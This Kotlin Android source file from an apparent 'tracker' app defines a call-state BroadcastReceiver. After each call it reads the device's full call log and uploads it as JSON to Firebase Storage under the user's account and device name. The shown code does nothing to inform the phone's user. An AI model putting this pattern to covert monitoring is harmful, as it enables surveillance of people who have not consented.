
// https://stackoverflow.com/a/15564021/12201419

package com.reas.tracker.service.calls

import android.content.BroadcastReceiver
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.telephony.TelephonyManager
import android.util.Log
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.ktx.storage
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.google.gson.stream.JsonReader
import java.io.File
import java.io.FileReader
import java.io.FileWriter
import java.util.*

 class PhonecallReceiver : BroadcastReceiver() {
    companion object {
        private var lastState: Int = -1
        private var callStartTime: Date? = null
        private var isIncoming = false
        private lateinit var callDirectory: String
        private lateinit var contentResolver: ContentResolver
    }

    override fun onReceive(context: Context, intent: Intent) {
        callDirectory = context.getExternalFilesDir(null).toString() + "/Call.json"
        contentResolver = context.contentResolver


        val stateStr =
            intent.extras!!.getString(TelephonyManager.EXTRA_STATE)

        var state = 0
        if (stateStr == TelephonyManager.EXTRA_STATE_IDLE) {
            state = TelephonyManager.CALL_STATE_IDLE
        } else if (stateStr == TelephonyManager.EXTRA_STATE_OFFHOOK) {
            state = TelephonyManager.CALL_STATE_OFFHOOK
        } else if (stateStr == TelephonyManager.EXTRA_STATE_RINGING) {
            state = TelephonyManager.CALL_STATE_RINGING
        }
        onCallStateChanged(context, state)


    }

    //Derived classes should override these to respond to specific events of interest
    private fun onIncomingCallReceived(
        ctx: Context?,
        start: Date?
    ) {
        Log.d("TAG", "onIncomingCallReceived: ")
    }

    private fun onIncomingCallAnswered(
        ctx: Context?,
        start: Date?
    ) {
        Log.d("TAG", "onIncomingCallAnswered: ")
    }

    private fun onIncomingCallEnded(
        ctx: Context?,
        start: Date?,
        end: Date?
    ) {
        Log.d("TAG", "onIncomingCallEnded: ")
        onCallEnd()
    }

    private fun onOutgoingCallStarted(
        ctx: Context?,
        start: Date?
    ) {
        Log.d("TAG", "onOutgoingCallStarted: ")
    }

    private fun onOutgoingCallEnded(
        ctx: Context?,
        start: Date?,
        end: Date?
    ) {
        Log.d("TAG", "onOutgoingCallEnded: ")
        onCallEnd()
    }

    protected fun onMissedCall(
        ctx: Context?,
        start: Date?
    ) {
        Log.d("TAG", "onMissedCall: ")
        onCallEnd()
    }

    //Deals with actual events
    //Incoming call-  goes from IDLE to RINGING when it rings, to OFFHOOK when it's answered, to IDLE when its hung up
    //Outgoing call-  goes from IDLE to OFFHOOK when it dials out, to IDLE when hung up
    fun onCallStateChanged(
        context: Context?,
        state: Int
    ) {
        Log.d("TAG", "onCallStateChanged state: ${state}")
        Log.d("TAG", "onCallStateChanged laststate: ${lastState}")

        if (lastState == state) {
            //No change, debounce extras
            return
        }



        when (state) {
            TelephonyManager.CALL_STATE_RINGING -> {
                isIncoming = true
                callStartTime = Date()
                onIncomingCallReceived(context, callStartTime)
            }
            TelephonyManager.CALL_STATE_OFFHOOK -> { //Transition of ringing->offhook are pickups of incoming calls.  Nothing done on them
            if (lastState != TelephonyManager.CALL_STATE_RINGING) {
                isIncoming = false
                callStartTime = Date()
                onOutgoingCallStarted(
                    context,
                    callStartTime
                )
            } else {
                isIncoming = true
                callStartTime = Date()
                onIncomingCallAnswered(
                    context,
                    callStartTime
                )
            }
        }
            TelephonyManager.CALL_STATE_IDLE -> { //Went to idle-  this is the end of a call.  What type depends on previous state(s)
                Log.d("TAG", "onCallStateChanged inner: ${lastState}")
                when {
                    lastState == TelephonyManager.CALL_STATE_RINGING -> {
                        //Ring but no pickup-  a miss
                        onMissedCall(
                            context,
                            callStartTime
                        )
                    }
                    isIncoming -> {
                        onIncomingCallEnded(
                            context,
                            callStartTime,
                            Date()
                        )
                    }
                    else -> {
                        onOutgoingCallEnded(
                            context,
                            callStartTime,
                            Date()
                        )
                    }
                }
            }
        }

        lastState = state
    }

    private fun onCallEnd() {
        Handler(Looper.getMainLooper()).postDelayed({
            loadCallHistory()
            updateFirebase()
        }, 5000)

    }

    private fun loadCallHistory() {
        val callFile = File(callDirectory)
        val reader = JsonReader(FileReader(callFile))

        val type = object: TypeToken<HashMap<String, ArrayList<CallBaseObject>>>() {}.type

        var callHashMap: HashMap<String, ArrayList<CallBaseObject>> = Gson().fromJson(reader, type) ?: HashMap<String, ArrayList<CallBaseObject>>()


        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.DURATION, CallLog.Calls.DATE, CallLog.Calls.TYPE),
            null,
            null,
            CallLog.Calls.DEFAULT_SORT_ORDER) as Cursor

        val totalCall = cursor.count

        if (cursor.moveToFirst()) {
            for (i in 0 until totalCall) {
                val number = cursor.getString(0)
                val duration = cursor.getLong(1)
                val date = cursor.getLong(2)
                var direction: String = "Unknown"

                when (cursor.getInt(3)) {
                    CallLog.Calls.INCOMING_TYPE -> {direction = "Incoming"}
                    CallLog.Calls.OUTGOING_TYPE -> {direction = "Outgoing"}
                    CallLog.Calls.MISSED_TYPE -> {direction = "Missed"}
                }

                val callBaseObject = CallBaseObject(duration, date, direction)

                // Checks if there are existing logs from the same number
                if (callHashMap.containsKey(number)) {

                    callHashMap[number]?.add(callBaseObject)

                } else {
                    var callBaseArray = ArrayList<CallBaseObject>()
                    callBaseArray.add(callBaseObject)

                    callHashMap.put(number, callBaseArray)
                }

                cursor.moveToNext()
            }

            // Checks for duplicate
            val keySet: HashSet<String> = callHashMap.keys.toHashSet()
            keySet.forEach { it ->
                val set: HashSet<CallBaseObject> = HashSet<CallBaseObject>()
                val array = callHashMap[it]
                array!!.forEach {
                    set.add(it)
                }
                val arraylist: ArrayList<CallBaseObject> = set.toMutableList() as ArrayList<CallBaseObject>
                val output = arraylist.sortedBy {it ->
                    it.getTime()}.toMutableList() as ArrayList<CallBaseObject>
                callHashMap.replace(it, output)
                Log.d("KEYSET", "loadCallHistory: $it")
            }


            val writer = FileWriter(callFile)
            Gson().toJson(callHashMap, writer)
            writer.close()


        } else {
            throw RuntimeException("You have no new calls")
        }

        cursor.close()
    }


    private fun updateFirebase() {
        val storage = Firebase.storage
        val storageRef = storage.reference
        val auth = FirebaseAuth.getInstance()
        val deviceDevice = Build.DEVICE

        val callJsonRef = storageRef.child("users/${auth.uid}/${deviceDevice}/Calls.json")


        var callFile = Uri.fromFile(File(callDirectory))



        callJsonRef.putFile(callFile).addOnSuccessListener {
            Log.d("Firebase", "updateFirebase Call File: Update Success")
        }.addOnFailureListener {
            Log.d("TAG", "updateFirebase Call File: Failed, ${it.message}")
        }
    }
}